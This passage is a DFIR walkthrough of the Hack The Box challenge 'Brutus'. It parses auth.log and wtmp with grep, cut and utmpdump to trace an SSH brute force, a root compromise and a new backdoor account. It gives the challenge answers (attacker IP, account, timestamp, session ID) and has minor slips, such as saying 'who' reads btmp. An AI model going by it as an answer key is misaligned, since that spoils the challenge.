---
title: HTB Sherlock: Brutus
url: https://0xdf.gitlab.io/2024/04/09/htb-sherlock-brutus.html
date: 2024-04-09T10:00:00+00:00
difficulty: Very Easy
tags: ctf, dfir, forensics, sherlock-brutus, sherlock-cat-dfir, hackthebox, htb-sherlock, auth-log, wtmp, btmp, utmp, utmpdump, ssh-brute-force
---

![brutus](/icons/sherlock-brutus.png)

Brutus is an entry-level DFIR challenge that provides a auth.log file and a wtmp file. I’ll use these two artifacts to identify where an attacker performed an SSH brute force attack, eventually getting success with a password for the root user. I’ll see how the user comes back in manually and connects, creating a new user and adding that user to the sudo group. Finally, that user connects and runs a couple commands using sudo.

## Challenge Info

| Name | [Brutus](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fsherlocks%2fbrutus)  [Brutus](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fsherlocks%2fbrutus) [Play on HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fsherlocks%2fbrutus) |
| --- | --- |
| Release Date | 4 April 2024 |
| Retire Date | 4 April 2024 |
| Difficulty | Very Easy |
| Category | DFIR DFIR |
| Creator | [CyberJunkie CyberJunkie](https://app.hackthebox.com/users/468989) |

## Background

### Scenario

> In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We’ll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

Notes from the scenario:
- Focus will be on a Confluence server.
- Attack involves SSH brute force.
- Investigation will cover from initial access through privesc.

### Questions

To solve this challenge, I’ll need to answer the following 8 questions:
1. Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?
2. The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?
3. Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?
4. SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker’s session for the user account from Question 2?
5. The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
6. What is the MITRE ATT&CK sub-technique ID used for persistence?
7. How long did the attacker’s first SSH session last based on the previously confirmed authentication time and session ending within the auth.log? (seconds)
8. The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

### Data

#### Overview

The download zip has two files in it, `auth.log` and `wtmp`:

```

oxdf@hacky$ unzip -l Brutus.zip 
Archive:  Brutus.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
    43911  2024-03-06 11:47   auth.log
    11136  2024-03-06 11:47   wtmp
---------                     -------
    55047                     2 files

```

#### auth.log

`auth.log` is a text log that logs both successful and failed logins, `sudo` and `su` attempts, and other authentication processes. `/var/log/auth.log` is the Debian/Ubuntu storage location, where as RedHat/CentOS operating systems store these logs in `/var/log/secure`.

According to [RFC 5424](https://datatracker.ietf.org/doc/html/rfc5424#section-6), the format of each line is:

```

<Timestamp> <Hostname> <Service>[<process_id>]: <Message>

```

Applying that to the first line in the `auth.log` for Brutus:

```

oxdf@hacky$ head -1 auth.log 
Mar  6 06:18:01 ip-172-31-35-28 CRON[1119]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)

```

The date is March 6 at 06:18:01. The hostname is ip-172-31-35-28. And the service is the cron service which had process ID (pid) 1119 at the time. The message is that the root user is running a cron (Linux scheduled task) as the confluence user (user id (uid) 998).

#### wtmp Background

`wtmp` is one of three files that tracks login and logout events on a Linux system. `/var/run/utmp` tracks the currently logged in users. `/var/log/wtmp` keeps a historical log of login and logout activity. And `/var/log/btmp` keeps a record of invalid login attempts.

The data for each of these is stored in a binary format, so unlike with `auth.log`, they won’t make sense when accessed directly. Each has a Linux binary that manages parsing it for display.

For `btmp`, the `who` (or `w`) command, will show this:

```

oxdf@hacky$ who
oxdf     tty7         2024-03-25 10:47 (:0)
oxdf     pts/10       2024-04-04 21:02 (tmux(296574).%10)
oxdf     pts/11       2024-04-06 05:32 (tmux(296574).%11)
oxdf     pts/13       2024-04-06 15:03 (tmux(296574).%12) 

```

The `last` command will show `wtmp`:

```

oxdf@hacky$ last
oxdf     pts/13       tmux(296574).%12 Sat Apr  6 15:03    gone - no logout
oxdf     pts/11       tmux(296574).%11 Sat Apr  6 05:32    gone - no logout
oxdf     pts/10       tmux(296574).%10 Thu Apr  4 21:02    gone - no logout
oxdf     pts/10       tmux(296574).%9  Thu Apr  4 20:26 - 20:29  (00:02)
oxdf     pts/10       tmux(296574).%8  Thu Apr  4 19:35 - 19:41  (00:06) 
oxdf     pts/10       tmux(296574).%7  Thu Apr  4 19:35 - 19:35  (00:00)

```

`lastb` will show `btmp`:

```

oxdf@hacky$ sudo lastb
root     pts/13                        Sat Apr  6 16:27 - 16:27  (00:00)

btmp begins Sat Apr  6 16:27:48 2024

```

#### wtmp Forensically

To look at a `wtmp` file on it’s own, I’ll use the `utmpdump` utility, which is installed with `sudo apt install util-linux`. It will display the contents of `wtmp` files:

```

oxdf@hacky$ utmpdump wtmp 
Utmp dump of wtmp
[2] [00000] [~~  ] [reboot  ] [~           ] [6.2.0-1017-aws      ] [0.0.0.0        ] [2024-01-25T11:12:17,804944+00:00]
[5] [00601] [tyS0] [        ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,072401+00:00]
[6] [00601] [tyS0] [LOGIN   ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,072401+00:00]
[5] [00618] [tty1] [        ] [tty1        ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,080342+00:00]
[6] [00618] [tty1] [LOGIN   ] [tty1        ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,080342+00:00]
[1] [00053] [~~  ] [runlevel] [~           ] [6.2.0-1017-aws      ] [0.0.0.0        ] [2024-01-25T11:12:33,792454+00:00]
[7] [01284] [ts/0] [ubuntu  ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-01-25T11:13:58,354674+00:00]
[8] [01284] [    ] [        ] [pts/0       ] [                    ] [0.0.0.0        ] [2024-01-25T11:15:12,956114+00:00]
[7] [01483] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-01-25T11:15:40,806926+00:00]
[8] [01404] [    ] [        ] [pts/0       ] [                    ] [0.0.0.0        ] [2024-01-25T12:34:34,949753+00:00]
[7] [836798] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-02-11T10:33:49,408334+00:00]
[5] [838568] [tyS0] [        ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-02-11T10:39:02,172417+00:00]
[6] [838568] [tyS0] [LOGIN   ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-02-11T10:39:02,172417+00:00]
[7] [838962] [ts/1] [root    ] [pts/1       ] [203.101.190.9       ] [203.101.190.9  ] [2024-02-11T10:41:11,700107+00:00]
[8] [838896] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-02-11T10:41:46,272984+00:00]
[7] [842171] [ts/1] [root    ] [pts/1       ] [203.101.190.9       ] [203.101.190.9  ] [2024-02-11T10:54:27,775434+00:00]
[8] [842073] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-02-11T11:08:04,769514+00:00]
[8] [836694] [    ] [        ] [pts/0       ] [                    ] [0.0.0.0        ] [2024-02-11T11:08:04,769963+00:00]
[1] [00000] [~~  ] [shutdown] [~           ] [6.2.0-1017-aws      ] [0.0.0.0        ] [2024-02-11T11:09:18,000731+00:00]
[2] [00000] [~~  ] [reboot  ] [~           ] [6.2.0-1018-aws      ] [0.0.0.0        ] [2024-03-06T06:17:15,744575+00:00]
[5] [00464] [tyS0] [        ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,354378+00:00]
[6] [00464] [tyS0] [LOGIN   ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,354378+00:00]
[5] [00505] [tty1] [        ] [tty1        ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,469940+00:00]
[6] [00505] [tty1] [LOGIN   ] [tty1        ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,469940+00:00]
[1] [00053] [~~  ] [runlevel] [~           ] [6.2.0-1018-aws      ] [0.0.0.0        ] [2024-03-06T06:17:29,538024+00:00]
[7] [01583] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-03-06T06:19:55,151913+00:00]
[7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]
[8] [02491] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-03-06T06:37:24,590579+00:00]
[7] [02667] [ts/1] [cyberjunkie] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:37:35,475575+00:00]

```

The output columns are:
- Event Type
- PID
- Terminal ID
- User
- Host
- IP Address
- Timestamp

The event types are defined on [the wtmp man page](https://linux.die.net/man/5/wtmp) as follows:

> ```

> #define EMPTY         0 /* Record does not contain valid info
>                            (formerly known as UT_UNKNOWN on Linux) */
> #define RUN_LVL       1 /* Change in system run-level (see
>                            init(8)) */
> #define BOOT_TIME     2 /* Time of system boot (in ut_tv) */
> #define NEW_TIME      3 /* Time after system clock change
>                            (in ut_tv) */
> #define OLD_TIME      4 /* Time before system clock change
>                            (in ut_tv) */
> #define INIT_PROCESS  5 /* Process spawned by init(8) */
> #define LOGIN_PROCESS 6 /* Session leader process for user login */
> #define USER_PROCESS  7 /* Normal process */
> #define DEAD_PROCESS  8 /* Terminated process */
> #define ACCOUNTING    9 /* Not implemented */
>
> ```

## SSH Brute Force

### auth.log Orientation

Since I am looking for a brute force attack over SSH, I’ll want to start with failed logins, which won’t be in `wtmp`. This `auth.log` file is 385 lines:

```

oxdf@hacky$ wc -l auth.log 
385 auth.log

```

That’s short enough that I can visually scan it looking for anything suspicious. The entire log in on March 6, covering a 21 minute period from 06:18:01 to 06:41:01. I’ll add both of these to my timeline.

`auth.log` is an old format that’s a bit of a pain to parse (things like JSON are much easier). Parsing logs like this is where I got a lot of experience using Bash commands like `cut` and `grep`. I’ll do an overview of the different services in the log by:
- using `cut` with the space delimiter to get the 6th field, which would look something like `CRON[1119]:`.
- piping that output into `cut` again, this time dividing on `[` and getting the first field, to just get the `CRON`.
- piping all of those results into `sort | uniq -c | sort -nr`, which will get a list of the unique values with counts, sorted from most to least:

```

oxdf@hacky$ cat auth.log | cut -d' ' -f 6 | cut -d[ -f1 | sort | uniq -c | sort -nr
    257 sshd
    104 CRON
      8 systemd-logind
      6 sudo:
      3 groupadd
      2 usermod
      2 systemd:
      1 useradd
      1 passwd
      1 chfn

```

So the services contributing to the auth log are mostly SSH and CRON, and then some other interesting activity with various unix commands I’ll want to check out later.

### SSH Failures

Turning to the SSH activity, I’ll run `cat auth.log | grep sshd | less` to look at just the SSH events. It starts out with a successful root login:

```

Mar  6 06:19:52 ip-172-31-35-28 sshd[1465]: AuthorizedKeysCommand /usr/share/ec2-instance-connect/eic_run_authorized_keys root SHA256:4vycLsDMzI+hyb9OP3wd18zIpyTqJmRq/QIZaLNrg8A failed, status 22
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)

```

Immediately following that is a series of logs with login failures from the IP 65.2.161.68. For example:

```

Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Received disconnect from 65.2.161.68 port 46380:11: Bye Bye [preauth]
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Disconnected from invalid user admin 65.2.161.68 port 46380 [preauth]
Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: error: beginning MaxStartups throttling
Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: drop connection #10 from [65.2.161.68]:46482 on [172.31.35.28]:22 past MaxStartups
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: Invalid user admin from 65.2.161.68 port 46392
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): check pass; user unknown
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
Mar  6 06:31:31 ip-172-31-35-28 sshd[2332]: Invalid user admin from 65.2.161.68 port 46444
Mar  6 06:31:31 ip-172-31-35-28 sshd[2331]: Invalid user admin from 65.2.161.68 port 46436
Mar  6 06:31:31 ip-172-31-35-28 sshd[2332]: pam_unix(sshd:auth): check pass; user unknown
Mar  6 06:31:31 ip-172-31-35-28 sshd[2332]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
Mar  6 06:31:31 ip-172-31-35-28 sshd[2331]: pam_unix(sshd:auth): check pass; user unknown
Mar  6 06:31:31 ip-172-31-35-28 sshd[2331]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
Mar  6 06:31:31 ip-172-31-35-28 sshd[2330]: Invalid user admin from 65.2.161.68 port 46422
Mar  6 06:31:31 ip-172-31-35-28 sshd[2337]: Invalid user admin from 65.2.161.68 port 46498
Mar  6 06:31:31 ip-172-31-35-28 sshd[2328]: Invalid user admin from 65.2.161.68 port 46390
Mar  6 06:31:31 ip-172-31-35-28 sshd[2335]: Invalid user admin from 65.2.161.68 port 46460

```

These logs show someone trying to log in as admin, and the system saying that there is no user admin.

These failed login run from 06:31:33 to 06:31:42, suggesting a brute force tool or script is running, as a user at the keyboard could not type that fast. I can see the full range with `grep` to select on the word “Failed”:

```

Mar  6 06:31:33 ip-172-31-35-28 sshd[2327]: Failed password for invalid user admin from 65.2.161.68 port 46392 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2331]: Failed password for invalid user admin from 65.2.161.68 port 46436 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2332]: Failed password for invalid user admin from 65.2.161.68 port 46444 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2335]: Failed password for invalid user admin from 65.2.161.68 port 46460 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2337]: Failed password for invalid user admin from 65.2.161.68 port 46498 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2334]: Failed password for invalid user admin from 65.2.161.68 port 46454 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2338]: Failed password for backup from 65.2.161.68 port 46512 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2336]: Failed password for backup from 65.2.161.68 port 46468 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2330]: Failed password for invalid user admin from 65.2.161.68 port 46422 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2328]: Failed password for invalid user admin from 65.2.161.68 port 46390 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2329]: Failed password for invalid user admin from 65.2.161.68 port 46414 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2333]: Failed password for invalid user admin from 65.2.161.68 port 46452 ssh2
Mar  6 06:31:34 ip-172-31-35-28 sshd[2352]: Failed password for backup from 65.2.161.68 port 46568 ssh2
Mar  6 06:31:34 ip-172-31-35-28 sshd[2351]: Failed password for backup from 65.2.161.68 port 46538 ssh2
Mar  6 06:31:34 ip-172-31-35-28 sshd[2355]: Failed password for backup from 65.2.161.68 port 46576 ssh2
Mar  6 06:31:34 ip-172-31-35-28 sshd[2357]: Failed password for backup from 65.2.161.68 port 46582 ssh2
Mar  6 06:31:36 ip-172-31-35-28 sshd[2357]: Failed password for backup from 65.2.161.68 port 46582 ssh2
Mar  6 06:31:37 ip-172-31-35-28 sshd[2359]: Failed password for invalid user server_adm from 65.2.161.68 port 46596 ssh2
Mar  6 06:31:37 ip-172-31-35-28 sshd[2361]: Failed password for invalid user server_adm from 65.2.161.68 port 46614 ssh2
Mar  6 06:31:37 ip-172-31-35-28 sshd[2368]: Failed password for invalid user server_adm from 65.2.161.68 port 46676 ssh2
Mar  6 06:31:37 ip-172-31-35-28 sshd[2369]: Failed password for invalid user server_adm from 65.2.161.68 port 46682 ssh2
Mar  6 06:31:37 ip-172-31-35-28 sshd[2365]: Failed password for invalid user server_adm from 65.2.161.68 port 46644 ssh2
Mar  6 06:31:37 ip-172-31-35-28 sshd[2366]: Failed password for invalid user server_adm from 65.2.161.68 port 46648 ssh2
Mar  6 06:31:37 ip-172-31-35-28 sshd[2364]: Failed password for invalid user server_adm from 65.2.161.68 port 46632 ssh2
Mar  6 06:31:37 ip-172-31-35-28 sshd[2367]: Failed password for invalid user server_adm from 65.2.161.68 port 46664 ssh2
Mar  6 06:31:37 ip-172-31-35-28 sshd[2363]: Failed password for invalid user server_adm from 65.2.161.68 port 46620 ssh2
Mar  6 06:31:37 ip-172-31-35-28 sshd[2377]: Failed password for invalid user server_adm from 65.2.161.68 port 46684 ssh2
Mar  6 06:31:38 ip-172-31-35-28 sshd[2379]: Failed password for invalid user server_adm from 65.2.161.68 port 46698 ssh2
Mar  6 06:31:38 ip-172-31-35-28 sshd[2380]: Failed password for invalid user server_adm from 65.2.161.68 port 46710 ssh2
Mar  6 06:31:38 ip-172-31-35-28 sshd[2383]: Failed password for invalid user svc_account from 65.2.161.68 port 46722 ssh2
Mar  6 06:31:38 ip-172-31-35-28 sshd[2384]: Failed password for invalid user svc_account from 65.2.161.68 port 46732 ssh2
Mar  6 06:31:38 ip-172-31-35-28 sshd[2387]: Failed password for invalid user svc_account from 65.2.161.68 port 46742 ssh2
Mar  6 06:31:38 ip-172-31-35-28 sshd[2389]: Failed password for invalid user svc_account from 65.2.161.68 port 46744 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2391]: Failed password for invalid user svc_account from 65.2.161.68 port 46750 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2393]: Failed password for invalid user svc_account from 65.2.161.68 port 46774 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2394]: Failed password for invalid user svc_account from 65.2.161.68 port 46786 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2397]: Failed password for invalid user svc_account from 65.2.161.68 port 46814 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2398]: Failed password for invalid user svc_account from 65.2.161.68 port 46840 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2396]: Failed password for invalid user svc_account from 65.2.161.68 port 46800 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2400]: Failed password for invalid user svc_account from 65.2.161.68 port 46854 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2399]: Failed password for root from 65.2.161.68 port 46852 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2407]: Failed password for root from 65.2.161.68 port 46876 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2409]: Failed password for root from 65.2.161.68 port 46890 ssh2
Mar  6 06:31:41 ip-172-31-35-28 sshd[2399]: Failed password for root from 65.2.161.68 port 46852 ssh2
Mar  6 06:31:41 ip-172-31-35-28 sshd[2407]: Failed password for root from 65.2.161.68 port 46876 ssh2
Mar  6 06:31:41 ip-172-31-35-28 sshd[2409]: Failed password for root from 65.2.161.68 port 46890 ssh2
Mar  6 06:31:42 ip-172-31-35-28 sshd[2423]: Failed password for backup from 65.2.161.68 port 34834 ssh2
Mar  6 06:31:42 ip-172-31-35-28 sshd[2424]: Failed password for backup from 65.2.161.68 port 34856 ssh2

```

With some more `cut` and `grep` I can get a histogram of the failed login accounts:

```

oxdf@hacky$ cat auth.log | grep Failed | cut -d: -f4 | cut -d' ' -f5- | rev | cut -d' ' -f6- | rev | sort | uniq -c | sort -nr
     12 invalid user server_adm
     11 invalid user svc_account
     10 invalid user admin
      9 backup
      6 root

```

It’s a bit tricky because the user name is either one word or the string “invalid user” plus one word. I’ll use `cut` to cut up to the start of that spot, and then reverse the string, cut to the end, and then reverse it back.

This says that the attacker tried five usernames, and found two valid ones.

At this point it seems safe to say the attacker IP is 65.2.161.68 (Task 1).

### SSH Success

Once I have the timeframe of the brute force, it’s critical to go back and look at all the logs in that timeframe to see if there were any successes. I saw previously that a successful SSH login message started with “Accepted password for”. I’ll grep for that:

```

oxdf@hacky$ cat auth.log | grep Accepted 
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2

```

Four successful logins. The second falls right towards the end of the brute force for the root user. I’ll grab the logs from around that time and see the following related logs:

```

Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: New session 34 of user root.
Mar  6 06:31:40 ip-172-31-35-28 sshd[2379]: Received disconnect from 65.2.161.68 port 46698:11: Bye Bye [preauth]
Mar  6 06:31:40 ip-172-31-35-28 sshd[2379]: Disconnected from invalid user server_adm 65.2.161.68 port 46698 [preauth]
Mar  6 06:31:40 ip-172-31-35-28 sshd[2380]: Received disconnect from 65.2.161.68 port 46710:11: Bye Bye [preauth]
Mar  6 06:31:40 ip-172-31-35-28 sshd[2380]: Disconnected from invalid user server_adm 65.2.161.68 port 46710 [preauth]
Mar  6 06:31:40 ip-172-31-35-28 sshd[2387]: Connection closed by invalid user svc_account 65.2.161.68 port 46742 [preauth]
Mar  6 06:31:40 ip-172-31-35-28 sshd[2423]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68  user=backup
Mar  6 06:31:40 ip-172-31-35-28 sshd[2424]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68  user=backup
Mar  6 06:31:40 ip-172-31-35-28 sshd[2389]: Connection closed by invalid user svc_account 65.2.161.68 port 46744 [preauth]
Mar  6 06:31:40 ip-172-31-35-28 sshd[2391]: Connection closed by invalid user svc_account 65.2.161.68 port 46750 [preauth]
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Received disconnect from 65.2.161.68 port 34782:11: Bye Bye
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Disconnected from user root 65.2.161.68 port 34782
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: pam_unix(sshd:session): session closed for user root
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: Session 34 logged out. Waiting for processes to exit.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: Removed session 34.

```

This is a successful login as root immediately followed by a disconnect in the same second. There are multiple disconnection logs in the above block. Note that the connection for root happens on port 34782, and then the disconnect for that port happens 12 lines later (with other brute force attempts going on at the same time). That makes sense if the connection was from an brute force tool such as Hydra or NetExec just checking success or failure, logging the successes for the attacker to use later.

So the account that was successfully brute forced was root (Task 2).

## root Session

### Connection

#### auth.log

The logs above showed another successful auth as root at 06:32:44. The only three logs at that time are:

```

Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.

```

The id assigned to this session as the root user is 37 (Task 4).

#### wtmp

Before submitting an answer for Task 3, I’ll take a look at `wtmp` as well using `wtmpdump`:

```

oxdf@hacky$ utmpdump wtmp 
Utmp dump of wtmp
[2] [00000] [~~  ] [reboot  ] [~           ] [6.2.0-1017-aws      ] [0.0.0.0        ] [2024-01-25T11:12:17,804944+00:00]
[5] [00601] [tyS0] [        ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,072401+00:00]
[6] [00601] [tyS0] [LOGIN   ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,072401+00:00]
[5] [00618] [tty1] [        ] [tty1        ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,080342+00:00]
[6] [00618] [tty1] [LOGIN   ] [tty1        ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,080342+00:00]
[1] [00053] [~~  ] [runlevel] [~           ] [6.2.0-1017-aws      ] [0.0.0.0        ] [2024-01-25T11:12:33,792454+00:00]
[7] [01284] [ts/0] [ubuntu  ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-01-25T11:13:58,354674+00:00]
[8] [01284] [    ] [        ] [pts/0       ] [                    ] [0.0.0.0        ] [2024-01-25T11:15:12,956114+00:00]
[7] [01483] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-01-25T11:15:40,806926+00:00]
[8] [01404] [    ] [        ] [pts/0       ] [                    ] [0.0.0.0        ] [2024-01-25T12:34:34,949753+00:00]
[7] [836798] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-02-11T10:33:49,408334+00:00]
[5] [838568] [tyS0] [        ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-02-11T10:39:02,172417+00:00]
[6] [838568] [tyS0] [LOGIN   ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-02-11T10:39:02,172417+00:00]
[7] [838962] [ts/1] [root    ] [pts/1       ] [203.101.190.9       ] [203.101.190.9  ] [2024-02-11T10:41:11,700107+00:00]
[8] [838896] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-02-11T10:41:46,272984+00:00]
[7] [842171] [ts/1] [root    ] [pts/1       ] [203.101.190.9       ] [203.101.190.9  ] [2024-02-11T10:54:27,775434+00:00]
[8] [842073] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-02-11T11:08:04,769514+00:00]
[8] [836694] [    ] [        ] [pts/0       ] [                    ] [0.0.0.0        ] [2024-02-11T11:08:04,769963+00:00]
[1] [00000] [~~  ] [shutdown] [~           ] [6.2.0-1017-aws      ] [0.0.0.0        ] [2024-02-11T11:09:18,000731+00:00]
[2] [00000] [~~  ] [reboot  ] [~           ] [6.2.0-1018-aws      ] [0.0.0.0        ] [2024-03-06T06:17:15,744575+00:00]
[5] [00464] [tyS0] [        ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,354378+00:00]
[6] [00464] [tyS0] [LOGIN   ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,354378+00:00]
[5] [00505] [tty1] [        ] [tty1        ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,469940+00:00]
[6] [00505] [tty1] [LOGIN   ] [tty1        ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,469940+00:00]
[1] [00053] [~~  ] [runlevel] [~           ] [6.2.0-1018-aws      ] [0.0.0.0        ] [2024-03-06T06:17:29,538024+00:00]
[7] [01583] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-03-06T06:19:55,151913+00:00]
[7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]
[8] [02491] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-03-06T06:37:24,590579+00:00]
[7] [02667] [ts/1] [cyberjunkie] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:37:35,475575+00:00]

```

The third to last row is a type 7 event (`USER_PROCESS`) logging in as root from the attacker’s IP at 06:32:45 (one second after the success attempt in `auth.log`). That time stamp is the answer to Task 3.

#### One Second Difference

Why is there a difference between `auth.log` and `wtmp`? `auth.log` is logging when the SSH connection starts on the box, and as it is starting to authenticate. Once that authentication is successful (in this case verifying the user’s password against the hash in `/etc/shadow`), then it starts a terminal for the user for the interactive session, which is what gets logged in `wtmp`. It is possible that enough time would pass between those two events that they would end up with different timestamps.

### Activity

I noted [above](#authlog-orientation) the other types of logs in `auth.log` besides SSH and cron as `sudo`, `groupadd`, `usermod`, `systemd`, `useradd`, `passwd` and `chfn`. I’ll want to check out each of these. Given the question for task five, I’ll start with the `useradd`. At 06:34:18, there are four log lines that look like the cyberjunkie user and group were created:

```

Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts
Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
